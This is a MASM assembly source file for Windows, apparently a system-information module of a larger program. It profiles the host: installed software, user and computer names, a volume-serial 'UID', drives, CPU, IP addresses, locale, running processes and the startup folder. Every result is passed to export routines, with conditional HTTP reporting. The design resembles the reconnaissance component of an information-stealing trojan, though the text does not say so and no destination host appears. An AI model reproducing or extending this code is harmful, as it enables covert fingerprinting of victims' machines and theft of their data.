; System info
; Tested on:
;	Windows XP Professional, SP1

.data
	@AllocStr <szSysInfoUinstStr>, 	<"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall">
	@AllocStr <szSysInfoValue>, 	<"DisplayName">
	@AllocStr <szSysInfoValueVer>,	<"DisplayVersion">
	@AllocStr <szSysInfoCDrive>,	<"C:\">
	@AllocMem <lpSysInfoCommonBuf>, <MAX_PATH+1>
	@AllocMem <lpSysInfoCommonValBuf>, <MAX_PATH+1>

.code

SIO_GET_INTERFACE_LIST equ _IOR('t', 127, DWORD)

INTERFACE_INFO struct DWORD
	iiFlags			DWORD	?
	iiAddress		sockaddr_in <>
	iiMore			DWORD 14 dup(?)
INTERFACE_INFO ends

; Get installed application names
GetInstalledApps proc
	LOCAL	hkHandle, BufLen, KeyIndex, DataType: DWORD
	
	invoke  RegOpenKey, HKEY_LOCAL_MACHINE, offset szSysInfoUinstStr, addr hkHandle
	test	eax, eax
	jnz	@ret
	
	; Enum registry entries
	mov	KeyIndex, 0
	
@enum:
	mov     BufLen, MAX_PATH-szSysInfoUinstStrLen-1
	xor	eax, eax
	invoke  RegEnumKeyEx, hkHandle, KeyIndex, offset lpSysInfoCommonBuf[szSysInfoUinstStrLen+1], addr BufLen, eax, eax, eax, eax
	test	eax, eax
	jnz	@enum_end

        ; Make the path
	invoke	lstrcpy, offset lpSysInfoCommonBuf, offset szSysInfoUinstStr
	mov	byte ptr lpSysInfoCommonBuf[szSysInfoUinstStrLen], '\'

        ; Read display name value
	mov	BufLen, MAX_PATH        
        invoke	RegReadValue, HKEY_LOCAL_MACHINE, offset lpSysInfoCommonBuf, offset szSysInfoValue, offset lpSysInfoCommonValBuf, addr BufLen  
	.IF	eax
		invoke	ExportStr, TYPE_SYSINFO_INST, 0, offset lpSysInfoCommonValBuf
		
		; Read display version value
		mov	BufLen, MAX_PATH        
		invoke	RegReadValue, HKEY_LOCAL_MACHINE, offset lpSysInfoCommonBuf, offset szSysInfoValueVer, offset lpSysInfoCommonValBuf, addr BufLen  
		.IF	eax
			invoke	ExportStr, TYPE_SYSINFO_INSTVER, 0, offset lpSysInfoCommonValBuf 
		.ENDIF 
	.ENDIF
	
	inc	KeyIndex
	jmp	@enum
	
@enum_end:	
	invoke	RegCloseKey, hkHandle

@ret:	
	ret
GetInstalledApps endp

MAX_PROCESSES equ 1024
MAX_INTERFACES equ 20
CPU_DETECTION_TIME equ 500 ; ms

GetSysInfoOutput proc uses esi edi ebx
	LOCAL	lpDrive, lpdwBufSize, hProcessSnap: DWORD
	LOCAL 	mst: MEMORYSTATUS
	LOCAL	ovi: OSVERSIONINFO
	LOCAL	pe32: PROCESSENTRY32
	LOCAL	me32: MODULEENTRY32
	LOCAL	lpSystemTime: SYSTEMTIME
	LOCAL	lpcbNeeded, lpcbModNeeded: DWORD
	LOCAL	procs[MAX_PROCESSES]: DWORD
	LOCAL	hModule: DWORD
	LOCAL	InterfaceList[MAX_INTERFACES]: INTERFACE_INFO
	LOCAL	nBytesReturned: DWORD
	
	; Write header	
	invoke	ExportModule, MODULE_SYSINFO

	; UID
	xor	ecx, ecx
	invoke	GetVolumeInformation, offset szSysInfoCDrive, ecx, ecx, addr lpDrive, ecx, ecx, ecx, ecx
	invoke	ExportData, TYPE_SYSINFO_UID, 0, addr lpDrive, 4
	
	; Time
	invoke	GetLocalTime, addr lpSystemTime
	invoke	ExportData, TYPE_SYSINFO_TIME, 0, addr lpSystemTime, sizeof SYSTEMTIME
	
	; Installed applications
	invoke	GetInstalledApps
	
	; Memory & OS
	mov	mst.dwLength, sizeof MEMORYSTATUS
	invoke  GlobalMemoryStatus, addr mst	
	
	mov     ovi.dwOSVersionInfoSize, sizeof OSVERSIONINFO
	invoke  GetVersionEx, addr ovi

	invoke	ExportData, TYPE_SYSINFO_MEM, 0, addr mst.dwMemoryLoad, 7*4 
	invoke	ExportData, TYPE_SYSINFO_OS, 0, addr ovi.dwMajorVersion, 4*4+128

	; User name & computer name
	mov	edi, offset lpSysInfoCommonBuf
	mov	lpdwBufSize, MAX_PATH
	invoke	GetUserName, edi, addr lpdwBufSize	
	invoke	ExportStr, TYPE_SYSINFO_NAME, SUBTYPE_SYSINFO_USER, edi

	mov	lpdwBufSize, MAX_PATH
	invoke	GetComputerName, edi, addr lpdwBufSize 	
	invoke	ExportStr, TYPE_SYSINFO_NAME, SUBTYPE_SYSINFO_COMP, edi
	
	; Drives
	invoke	GetLogicalDrives
	mov	ebx, eax
	m2m	ecx, 31
	mov	lpDrive, '\:A'

@loop_drvs:
	push	ecx
	shr	ebx, 1
	.IF	CARRY?
		invoke	GetDriveType, addr lpDrive
		mov	dword ptr[edi], eax
		.IF	eax == DRIVE_FIXED
			.IF	dwGetDiskFreeSpaceEx
				lea	eax, dword ptr[edi+4]
				push	eax
				lea	eax, dword ptr[edi+12]
				push	eax
				push	NULL
				lea	eax, lpDrive
				push	eax
				call	dwGetDiskFreeSpaceEx
				mov	eax, TYPE_SYSINFO_DRIVE_EX
			.ELSE
				invoke  GetDiskFreeSpace, addr lpDrive, addr[edi+4], addr[edi+8], addr[edi+12], addr[edi+16]
				mov	eax, TYPE_SYSINFO_DRIVE
			.ENDIF
		.ELSE
			mov	eax, TYPE_SYSINFO_DRIVE
		.ENDIF
		invoke	ExportData, eax, lpDrive, edi, 20
	.ENDIF
	inc	byte ptr[lpDrive]
	pop	ecx
	loop	@loop_drvs
	
	; CPU speed (can a bit less or more then actual)
	rdtsc	; Read Time-Stamp Counter
	mov 	ebx, eax

	; Let CPU execute some instructions
	invoke 	Sleep, CPU_DETECTION_TIME

	rdtsc	; Read Time-Stamp Counter
	sub	eax, ebx ; Delta

	xor	edx, edx
	mov	ecx, CPU_DETECTION_TIME*1000
	div	ecx ; Ticks->MHZ
	
	mov	lpdwBufSize, eax
	invoke	ExportData, TYPE_SYSINFO_CPU, SUBTYPE_SYSINFO_CSPEED, addr lpdwBufSize, 4
	
	; CPU vendor
	mov	edi, offset lpSysInfoCommonBuf
	xor     eax, eax
	cpuid
	mov     dword ptr[edi+00], ebx
	mov     dword ptr[edi+04], edx
	mov     dword ptr[edi+08], ecx
	mov     byte  ptr[edi+12], 0

        invoke	ExportStr, TYPE_SYSINFO_CPU, SUBTYPE_SYSINFO_CVENDOR, edi
        
	; CPU version (Type, Family, Model, and Stepping ID)
	m2m	eax, 1
	cpuid

	mov	lpdwBufSize, eax
	invoke	ExportData, TYPE_SYSINFO_CPU, SUBTYPE_SYSINFO_CINFO, addr lpdwBufSize, 4
IFDEF MOD_HTTP
IFDEF MOD_RIP
	; Local host & IP
	invoke  gethostname, offset lpSysInfoCommonBuf, MAX_PATH
	test	eax, eax
	jnz	@ip_err
	
	invoke	ExportStr, TYPE_SYSINFO_HOST, 0, offset lpSysInfoCommonBuf
	
	invoke	socket, AF_INET, SOCK_DGRAM, 0
	mov	ebx, eax
	inc	eax
	jz	@ip_err
	
	lea	edi, InterfaceList
	invoke	WSAIoctl, ebx, SIO_GET_INTERFACE_LIST, 0, 0, edi, MAX_INTERFACES * sizeof INTERFACE_INFO, addr nBytesReturned, 0, 0
	inc	eax
	jz	@ip_err_close

	mov	eax, nBytesReturned
	xor	edx, edx
	mov	ecx, sizeof INTERFACE_INFO
	div	ecx
	mov	esi, eax
	dec	esi
	.WHILE	!SIGN?
		invoke	ExportData, TYPE_SYSINFO_IP, 0, addr [edi][INTERFACE_INFO.iiAddress.sin_addr], 4
		add	edi, sizeof INTERFACE_INFO
		dec	esi
	.ENDW
	
@ip_err_close:	
	invoke	closesocket, ebx
	
@ip_err:
ENDIF
ELSE
	; Local host & IP
	invoke  gethostname, offset lpSysInfoCommonBuf, MAX_PATH
	test	eax, eax
	jnz	@ip_err
	
	invoke	ExportStr, TYPE_SYSINFO_HOST, 0, offset lpSysInfoCommonBuf
	
	invoke	socket, AF_INET, SOCK_DGRAM, 0
	mov	ebx, eax
	inc	eax
	jz	@ip_err
	
	lea	edi, InterfaceList
	invoke	WSAIoctl, ebx, SIO_GET_INTERFACE_LIST, 0, 0, edi, MAX_INTERFACES * sizeof INTERFACE_INFO, addr nBytesReturned, 0, 0
	inc	eax
	jz	@ip_err_close

	mov	eax, nBytesReturned
	xor	edx, edx
	mov	ecx, sizeof INTERFACE_INFO
	div	ecx
	mov	esi, eax
	dec	esi
	.WHILE	!SIGN?
		invoke	ExportData, TYPE_SYSINFO_IP, 0, addr [edi][INTERFACE_INFO.iiAddress.sin_addr], 4
		add	edi, sizeof INTERFACE_INFO
		dec	esi
	.ENDW
	
@ip_err_close:	
	invoke	closesocket, ebx
	
@ip_err:
ENDIF
	; Country
	invoke	GetLocaleInfo, LOCALE_USER_DEFAULT, LOCALE_SENGCOUNTRY, offset lpSysInfoCommonBuf, MAX_PATH
	invoke	ExportStr, TYPE_SYSINFO_CNTRY, 0, offset lpSysInfoCommonBuf
	
	; Language
	invoke	GetLocaleInfo, LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE, offset lpSysInfoCommonBuf, MAX_PATH
	invoke	ExportStr, TYPE_SYSINFO_LANG, 0, offset lpSysInfoCommonBuf
	
	; Process list
	.IF	ovi.dwPlatformId == VER_PLATFORM_WIN32_NT
		; WinNT
		lea	esi, procs
		lea	eax, lpcbNeeded
		push	eax
		push	MAX_PROCESSES*4
		push	esi
		call	dwEnumProcesses
		.IF	eax
			shr	lpcbNeeded, 2
			.IF	lpcbNeeded > MAX_PROCESSES
				mov	lpcbNeeded, MAX_PROCESSES
			.ENDIF
			
			.WHILE	lpcbNeeded
				lodsd
				invoke	OpenProcess, PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, FALSE, eax
				test	eax, eax
				jz	@open_proc_err
				
				mov	ebx, eax
				lea	edx, lpcbModNeeded
				push	edx
				push	4
				lea	edx, hModule
				push	edx
				push	eax
				call	dwEnumProcessModules
				.IF	(eax) && (lpcbModNeeded >= 4)
					push	MAX_PATH
					push	offset lpSysInfoCommonBuf
					push	hModule
					push	ebx
					call	dwGetModuleFileNameEx
					.IF	eax
						invoke	ExportStr, TYPE_SYSINFO_PROC, 0, offset lpSysInfoCommonBuf
					.ENDIF
				.ENDIF
				invoke	CloseHandle, ebx
				
			@open_proc_err:
				dec	lpcbNeeded
			.ENDW
		.ENDIF
	.ELSE
		; Win9x
		mov	pe32.dwSize, sizeof PROCESSENTRY32	
		invoke	CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
		inc	eax
		jz	@proc_err
		
		mov	hProcessSnap, eax	
		invoke	Process32First, hProcessSnap, addr pe32	
		.WHILE	eax
			invoke	ExportStr, TYPE_SYSINFO_PROC, 0, addr pe32.szExeFile
			invoke	Process32Next, hProcessSnap, addr pe32
		.ENDW
		invoke	CloseHandle, hProcessSnap
	.ENDIF

@proc_err:
	; Folders
	invoke	GetWindowsDirectory, offset lpSysInfoCommonBuf, MAX_PATH
	invoke	ExportStr, TYPE_SYSINFO_FOLDER, SUBTYPE_SYSINFO_WINDOWS, offset lpSysInfoCommonBuf
	
	invoke	GetSystemDirectory, offset lpSysInfoCommonBuf, MAX_PATH
	invoke	ExportStr, TYPE_SYSINFO_FOLDER, SUBTYPE_SYSINFO_SYSTEM, offset lpSysInfoCommonBuf
	
	invoke	GetCurrentDirectory, MAX_PATH, offset lpSysInfoCommonBuf
	invoke	ExportStr, TYPE_SYSINFO_FOLDER, SUBTYPE_SYSINFO_CURRENT, offset lpSysInfoCommonBuf	 
	
	invoke	GetTempPath, MAX_PATH, offset lpSysInfoCommonBuf
	.IF	eax
		invoke	ExportStr, TYPE_SYSINFO_FOLDER, SUBTYPE_SYSINFO_TEMP, offset lpSysInfoCommonBuf
	.ENDIF
	
	.IF	dwSHGetFolderPath
		push	offset lpSysInfoCommonBuf
		push	0
		push	NULL
		push	CSIDL_STARTUP
		push	NULL
		call	dwSHGetFolderPath
		.IF	eax == S_OK
			invoke	ExportStr, TYPE_SYSINFO_FOLDER, SUBTYPE_SYSINFO_STARTUP, offset lpSysInfoCommonBuf
		.ENDIF
	.ENDIF
	
	; Desktop size & resolution
	invoke	GetDC, 0
	mov	ebx, eax	
	invoke	GetDeviceCaps, ebx, HORZRES
	mov	lpDrive, eax	
	invoke	ExportData, TYPE_SYSINFP_D_WIDTH, 0, addr lpDrive, 4
	invoke	GetDeviceCaps, ebx, VERTRES
	mov	lpDrive, eax	
	invoke	ExportData, TYPE_SYSINFP_D_HEIGHT, 0, addr lpDrive, 4
	invoke	GetDeviceCaps, ebx, BITSPIXEL
	mov	lpDrive, eax	
	invoke	ExportData, TYPE_SYSINFP_D_RES, 0, addr lpDrive, 4
	invoke	ReleaseDC, 0, ebx
	
	ret
GetSysInfoOutput endp
